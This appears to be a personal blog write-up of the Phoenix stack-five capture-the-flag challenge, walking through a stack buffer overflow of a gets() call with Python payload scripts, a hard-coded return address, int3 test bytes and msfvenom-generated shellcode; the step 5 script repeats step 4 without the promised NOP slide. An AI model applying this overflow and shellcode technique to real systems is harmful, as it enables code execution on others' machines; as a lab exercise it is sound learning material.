---
title: Phoenix - stack_five
date: 2026-05-30 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix stack_five ctf
toc: true
---

## Introduction
I will be explaining how i did the challenge stack_five from the series Phoenix found at <https://exploit.education/phoenix/stack-five/>

## Step one
Firstly, ensure that the stack is readable, writable and executable via:

![](assets/posts/PWN/phoenix_stack_five/stack_exec.png)


Before debugging it, i inspected the source code:

```

/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

```

My plan is to overflow `buffer` which would cause the memory address to be on the stack. This memory address will then be loaded into EIP causing shell code to be executed.

## Step two - how it will work

At this breakpoint, i can see that the topaddress on the stack is `0x565561ed`. This is followed with ESP being `0xffffd51c`. This means the stack address `0xffffd51c`containing the address `0x565561ed` will be loaded into EIP via __ret__.

![](assets/posts/PWN/phoenix_stack_five/ret_esp.png)

At the next instruction, i can see its address is the same as the previous top value on the stack. This proves that i can potentially use the stack address `0xffffd51c` to load shell code. 

![](assets/posts/PWN/phoenix_stack_five/after_ret.png)


## Step 3 - how much to overflow 

To successfully push values onto the stack, i must overflow `buffer`. My current payload generator script for this is:

```
# overflow
import struct
import sys
padding =b"AAAAAAAAAAAAAAAABBBBBBBBBBBBBBCCCCCCCCCCCCCDDDDDDDDDDDDEEEEEEEEEEEFFFFFFFFGGGGGGHHHHGGHHHHHIIIIIIIIIIJJJJJJJKKKKKKKLLLLLLLLLMMMMMMMMMMMMMNNNNNNNNNOOOO"
sys.stdout.buffer.write(padding)
```

Use python to run this file and load its output into another file:

```
python stack_five_payload_gen > stack_five_payload
```

I wll proceed to run stack_five via:

```
run < stack_five_payload
```

As seen below, I have successfully pushed values onto the stack. When referring to my script, the overflowed values are `OOOO`. That means that anything after `N` will be overflowed onto the stack.


![](assets/posts/PWN/phoenix_stack_five/payload1.png)

## Step 4 - setting the payload
So now i know that i can place values onto the stack, i will proceed to configure my payload to first contain the address i want the EIP to go to. Secondly, this is followed by an instruction which in this case is an interrupt. My new payload is now:

```

# overflow
import struct
import sys
padding =b"AAAAAAAAAAAAAAAABBBBBBBBBBBBBBCCCCCCCCCCCCCDDDDDDDDDDDDEEEEEEEEEEEFFFFFFFFGGGGGGHHHHGGHHHHHIIIIIIIIIIJJJJJJJKKKKKKKLLLLLLLLLMMMMMMMMMMMMMNNNNNNNNN"
#eip
eip = struct.pack("I",0xffffd51c)
#payload
payload = b"\xCC"*4
#final                        
sys.stdout.buffer.write(padding+eip+payload)
```

Create the new payload and run with it. As seen in the image below, this works as the EIP will execute at `0xffffd51c` which goes to the instruction int3. 

![](assets/posts/PWN/phoenix_stack_five/POC.png)



## Step 5 - getting a shell 
Now that i know it works, it is time to load a shell. I will be also using a NOP slide for this. A NOP slide is a series of instructions that tells the CPU to do nothing and move on to the next instruction. It's usually used to control the flow of execution for shell code. 

A NOP slide will be used instead of the current static memory address to deal with situations where the stack changes (every situation). So instead of the static memory not working, the CPU will just read the NOP instruction on the stack and move on the next and the next. Eventually this leads to the shell code. Hence, my script will now be:

```
# overflow
import struct
import sys
padding =b"AAAAAAAAAAAAAAAABBBBBBBBBBBBBBCCCCCCCCCCCCCDDDDDDDDDDDDEEEEEEEEEEEFFFFFFFFGGGGGGHHHHGGHHHHHIIIIIIIIIIJJJJJJJKKKKKKKLLLLLLLLLMMMMMMMMMMMMMNNNNNNNNN"
#eip
eip = struct.pack("I",0xffffd51c)
#payload
payload = b"\xCC"*4
#final                        
sys.stdout.buffer.write(padding+eip+payload)

```

Now i will run it again.

![](assets/posts/PWN/phoenix_stack_five/POC.png)

Finally, i will implement the actual code to start /bin/sh. I got the shell code via the following command:

```
msfvenom -p linux/x86/exec  -f python
```

Copy the output into the script. After running the new script, this should now be shown:

![](assets/posts/PWN/phoenix_stack_five/shell1.png)


